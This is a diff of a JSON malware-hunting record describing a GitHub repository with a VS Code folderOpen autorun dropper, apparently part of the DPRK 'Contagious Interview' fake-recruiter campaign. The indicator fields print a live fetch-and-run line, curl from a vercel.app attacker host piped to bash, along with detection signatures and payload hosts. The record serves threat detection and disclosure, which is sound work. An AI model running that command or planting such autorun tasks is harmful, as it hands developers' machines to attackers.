@@ -17,12 +17,12 @@
     "evidence_locations": "best-city436-poc/.vscode/tasks.json:0; best-city436-poc/server/middlewares/validator/errorHandler.js:51; best-city436-poc/server/middlewares/validator/errorHandler.js:52; best-city436-poc/server/middlewares/validator/errorHandler.js:53",
     "c2_hosts": "vscode-settings-config.vercel.app; vscode-settings-config.ver",
     "iocs": "vscode-settings-config.vercel.app; https://vscode-settings-config.vercel.app/settings/mac?flag=606; https://vscode-settings-config.vercel.app/settings/linux?flag=606; curl 'https://vscode-settings-config.vercel.app/settings/mac?flag=606' | bash; best-city436-poc/.vscode/tasks.json",
-    "matched_signatures": "settings/linux?flag=; folderOpen curl filename:tasks.json",
-    "reasons": "Shares a confirmed-malware code signature ['settings/linux?flag=', 'folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 9)",
+    "matched_signatures": "settings/mac?flag=; settings/windows?flag=; folderOpen curl filename:tasks.json",
+    "reasons": "Shares a confirmed-malware code signature ['settings/mac?flag=', 'settings/windows?flag=', 'folderOpen curl filename:tasks.json'] | Tier-2 confirmed (bash score 9)",
     "osm_status": "not_submitted",
     "osm_threat_id": "",
-    "first_seen": "hunt-20260928T024937Z",
-    "last_seen": "hunt-20260928T024937Z",
+    "first_seen": "hunt-20261005T094859Z",
+    "last_seen": "hunt-20261005T094859Z",
     "evidence_file": "repositories/anshuman-jha_toku_assestment.json",
     "reviewer_decision": "",
     "notes": ""
@@ -69,7 +69,7 @@
     "report_type": "repository",
     "resource_identifier": "https://github.com/anshuman-jha/toku_assestment",
     "version_info": "all",
-    "threat_description": "VS Code autorun dropper. Payload in best-city436-poc/.vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-settings-config.vercel.app and executes it (best-city436-poc/.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-settings-config.vercel.app.\nCampaign GW-C-498a0aeb: one of 86 confirmed repos across 58 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including 260120.vercel.app, default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-settings-config.vercel.app.\nFound by GitHub code search for a confirmed malware signature: settings/linux?flag=; folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
+    "threat_description": "VS Code autorun dropper. Payload in best-city436-poc/.vscode/tasks.json.\nOutbound: fetch-and-run. It downloads code from vscode-settings-config.vercel.app and executes it (best-city436-poc/.vscode/tasks.json).\nRuns automatically when the folder is opened in VS Code (hidden folderOpen task that fetches and runs a remote script).\nMatches PolinRider / Contagious Interview (DPRK): fake-recruiter coding tasks that run a downloader when opened in VS Code. Payload host: vscode-settings-config.vercel.app.\nCampaign GW-C-498a0aeb: one of 81 confirmed repos across 69 accounts sharing the dropper URL shape settings/{os}?flag=. Payload served from 18 distinct hosts, including default-configuration-sandy.vercel.app, default-configuration.vercel.app, isvalid-regions.vercel.app, vscode-bootstrapper.vercel.app, vscode-config-settings.vercel.app.\nAttribution: we assess this repository as PROBABLE North Korea PolinRider activity. Signals: Delivery vector matches Contagious-Interview tradecraft: vscode-folderopen-autorun, dprk-dropper-path-shape; Payload host is curated known-DPRK / Contagious-Interview infrastructure: vscode-settings-config.vercel.app.\nFound by GitHub code search for a confirmed malware signature: settings/mac?flag=; settings/windows?flag=; folderOpen curl filename:tasks.json.\nConfirmed by static analysis; the code was read, never executed.",
     "payload_description": "Malicious payload found in: best-city436-poc/.vscode/tasks.json\n- Outbound: fetch-and-run. It downloads code from vscode-settings-config.vercel.app and executes it (best-city436-poc/.vscode/tasks.json).\n- best-city436-poc/.vscode/tasks.json: VS Code task with runOn: folderOpen; runs the moment the folder is opened, no install or click needed\n- Attacker hosts: vscode-settings-config.vercel.app",
     "publisher": "anshuman-jha",
     "severity_level": "critical",
@@ -87,7 +87,7 @@
     "evidence_references": "https://github.com/anshuman-jha/toku_assestment/blob/cfc43399a3ab32349bc74695ee39738775a6a4a0/best-city436-poc/.vscode/tasks.json\nhttps://github.com/anshuman-jha/toku_assestment/blob/cfc43399a3ab32349bc74695ee39738775a6a4a0/best-city436-poc/server/middlewares/validator/errorHandler.js#L51\nhttps://github.com/anshuman-jha/toku_assestment/blob/cfc43399a3ab32349bc74695ee39738775a6a4a0/best-city436-poc/server/middlewares/validator/errorHandler.js#L52\nhttps://github.com/anshuman-jha/toku_assestment/blob/cfc43399a3ab32349bc74695ee39738775a6a4a0/best-city436-poc/server/middlewares/validator/errorHandler.js#L53",
     "verified_iocs": "vscode-settings-config.vercel.app\nhttps://vscode-settings-config.vercel.app/settings/mac?flag=606\nhttps://vscode-settings-config.vercel.app/settings/linux?flag=606\ncurl 'https://vscode-settings-config.vercel.app/settings/mac?flag=606' | bash\nbest-city436-poc/.vscode/tasks.json",
     "contributors": [],
-    "first_seen": "2026-09-28T02:49:37Z",
-    "last_seen": "2026-09-28T02:49:37Z"
+    "first_seen": "2026-10-05T09:48:59Z",
+    "last_seen": "2026-10-05T09:48:59Z"
   }
 }
